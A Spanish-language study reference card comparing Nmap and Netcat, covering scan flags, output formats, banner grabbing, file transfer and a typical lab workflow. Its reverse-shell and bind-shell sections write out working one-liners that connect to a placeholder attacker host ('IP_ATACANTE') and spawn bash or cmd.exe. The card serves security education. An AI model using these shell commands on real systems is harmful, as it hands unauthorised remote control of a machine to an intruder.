# 🔧 Reference Card — Netcat vs Nmap
> **Propósito:** Guía de referencia rápida para no confundir ambas herramientas y recordar sus usos más comunes.

---

## 🧠 La Diferencia en Una Línea

| Tool | ¿Qué es? | Analogía |
|---|---|---|
| **Nmap** | **Escáner** — Descubre qué hay en la red y qué está abierto | Guardía que revisa qué puertas existen y cuáles están abiertas |
| **Netcat** | **Conector** — Se comunica directamente a través de puertos | La persona que entra por esa puerta y habla con lo que hay adentro |

> **Regla mental:** Nmap te dice *qué existe*. Netcat te deja *interactuar con ello*.

---

## 🗺️ NMAP — Network Mapper

**¿Para qué sirve?** Descubrir hosts activos en una red, identificar puertos abiertos, detectar servicios y versiones, y detectar el sistema operativo.

### Flags más usados

```bash
# Descubrir hosts vivos (sin escanear puertos)
nmap -sn 192.168.1.0/24

# Escaneo básico de puertos (top 1000)
nmap 192.168.1.10

# Escaneo de puertos específicos
nmap -p 22,80,443 192.168.1.10

# Escaneo de TODOS los puertos
nmap -p- 192.168.1.10

# Detectar versiones de servicios
nmap -sV 192.168.1.10

# Detectar sistema operativo
nmap -O 192.168.1.10

# Escaneo stealth SYN (no completa el handshake)
nmap -sS 192.168.1.10

# Escaneo agresivo (OS + versiones + scripts + traceroute)
nmap -A 192.168.1.10

# Forzar escaneo aunque el host no responda a ping
nmap -Pn 192.168.1.10

# Guardar el resultado en un archivo
nmap -oN resultado.txt 192.168.1.10

# Escaneo con scripts de vulnerabilidades
nmap --script vuln 192.168.1.10

# Verbose (más detalle en pantalla)
nmap -v 192.168.1.10
nmap -vv 192.168.1.10
```

### Tipos de escaneo — resumen rápido

| Flag | Tipo | Cuándo usarlo |
|---|---|---|
| `-sn` | Ping sweep | Solo quiero saber qué hosts están vivos |
| `-sS` | SYN Stealth | Escaneo silencioso, no completa conexión |
| `-sT` | TCP Connect | Escaneo completo (más ruidoso) |
| `-sU` | UDP | Cuando quiero escanear servicios UDP |
| `-sV` | Versiones | Quiero saber qué software corre en cada puerto |
| `-O` | OS Detection | Quiero saber el sistema operativo del target |
| `-A` | Agresivo | Todo a la vez (OS + versión + scripts + traceroute) |
| `-Pn` | Sin ping | El host bloquea ICMP pero quiero escanearlo igual |

### Formatos de salida

```bash
-oN archivo.txt     # Formato normal (legible)
-oX archivo.xml     # Formato XML
-oG archivo.grep    # Formato grep-able
-oA basename        # Los tres formatos a la vez
```

### Rangos y targets

```bash
nmap 192.168.1.1-50          # Rango de IPs
nmap 192.168.1.0/24          # Subred completa
nmap 10.10.10.5 10.10.10.8   # IPs específicas
nmap -iL targets.txt         # Lista desde un archivo
```

---

## 🔌 NETCAT — El "Navaja Suiza" de TCP/UDP

**¿Para qué sirve?** Crear conexiones TCP/UDP directas, escuchar puertos, transferir datos, hacer banner grabbing, y — en pentesting — establecer shells remotos (bind shell o reverse shell).

> **Piénsalo así:** Netcat es como un teléfono. Puedes llamar a alguien (conectarte a un puerto) o esperar que te llamen (escuchar en un puerto). Una vez conectado, lo que escribas va directo al otro lado.

### Sintaxis base

```bash
# Conectarse a un host:puerto (modo cliente)
nc [IP] [PUERTO]

# Escuchar en un puerto (modo servidor)
nc -l -p [PUERTO]
nc -lvp [PUERTO]       # con verbose
```

### Flags más usados

| Flag | Significado |
|---|---|
| `-l` | Listen — escucha conexiones entrantes |
| `-p` | Puerto a usar |
| `-v` | Verbose — muestra más información |
| `-vv` | Muy verbose |
| `-n` | No resolver DNS (solo IPs numéricas) |
| `-z` | Zero I/O — solo escanea, no envía datos |
| `-u` | Modo UDP en vez de TCP |
| `-e` | Ejecuta un programa al conectar (no disponible en todas las versiones) |
| `-w` | Timeout en segundos |

---

### Usos prácticos

#### 1. Banner Grabbing — ver qué corre en un puerto

```bash
nc -v 192.168.1.10 80
# Luego escribe: GET / HTTP/1.0  (y presiona Enter dos veces)
# El servidor responde con sus cabeceras — revelas versión, tecnología, etc.

nc -v 192.168.1.10 22    # Ver banner de SSH
nc -v 192.168.1.10 21    # Ver banner de FTP
```

#### 2. Port Scanning rápido (sin Nmap)

```bash
# Escanear un rango de puertos (-z = no enviar datos)
nc -zv 192.168.1.10 20-100

# Escanear puertos específicos
nc -zv 192.168.1.10 22 80 443
```

> ⚠️ Para escaneo en serio usa Nmap. Este uso de nc es para verificaciones rápidas de un puerto específico.

#### 3. Verificar si un puerto está abierto (un solo puerto)

```bash
nc -zv 192.168.1.10 22
# Succeeded = puerto abierto
# Refused   = puerto cerrado o filtrado
```

#### 4. Transferencia de archivos

```bash
# En la máquina RECEPTORA (escucha):
nc -lvp 4444 > archivo_recibido.txt

# En la máquina EMISORA (envía):
nc 192.168.1.10 4444 < archivo_a_enviar.txt
```

#### 5. Chat simple entre dos máquinas

```bash
# Máquina A (escucha):
nc -lvp 5000

# Máquina B (se conecta):
nc 192.168.1.5 5000

# Lo que escribas en cualquiera aparece en la otra
```

#### 6. Reverse Shell — el uso más común en pentesting

Una **reverse shell** hace que el target *se conecte de vuelta* al atacante. Útil porque los firewalls normalmente bloquean conexiones entrantes pero permiten las salientes.

```bash
# ATACANTE — escucha esperando la conexión:
nc -lvp 4444

# TARGET (víctima) — ejecuta esto para conectarse de vuelta:
# En Linux:
bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1

# En Windows (cmd):
nc.exe IP_ATACANTE 4444 -e cmd.exe

# En Linux con nc (si soporta -e):
nc IP_ATACANTE 4444 -e /bin/bash
```

#### 7. Bind Shell

El target abre un puerto y *espera* que el atacante se conecte.

```bash
# TARGET — abre el puerto y vincula shell:
nc -lvp 4444 -e /bin/bash

# ATACANTE — se conecta al puerto del target:
nc 192.168.1.10 4444
```

---

## ⚡ Comparación Directa

| Situación | ¿Qué uso? |
|---|---|
| Quiero saber qué hosts están vivos en la red | **Nmap** (`-sn`) |
| Quiero ver qué puertos tiene abiertos un servidor | **Nmap** (`-p-` o default) |
| Quiero saber qué versión de Apache corre en el puerto 80 | **Nmap** (`-sV`) |
| Quiero saber si el puerto 22 está abierto en una IP específica | **Netcat** (`-zv`) |
| Quiero ver el banner de un servicio | **Netcat** (conectar al puerto y leer) |
| Quiero recibir una reverse shell | **Netcat** (`-lvp`) |
| Quiero transferir un archivo entre máquinas | **Netcat** (pipe con redirección) |
| Quiero ejecutar scripts de vulnerabilidades | **Nmap** (`--script vuln`) |
| Quiero hacer un chat entre dos máquinas en el lab | **Netcat** |

---

## 🧪 Workflow típico en un lab

```bash
# Paso 1 — Reconocimiento: ¿qué hay en la red?
nmap -sn 10.10.10.0/24

# Paso 2 — Escaneo: ¿qué puertos y servicios tiene el target?
nmap -sV -p- 10.10.10.5

# Paso 3 — Verificación rápida de un puerto específico:
nc -zv 10.10.10.5 80

# Paso 4 — Banner grabbing del servicio:
nc -v 10.10.10.5 80

# Paso 5 — Escuchar para recibir una shell:
nc -lvp 4444
```

---

## 📝 Notas & Preguntas

> *[ Escribe aquí tus dudas, insights o conexiones con otros conceptos ]*

---

*Reference Card — Netcat vs Nmap | Cybersecurity 101*
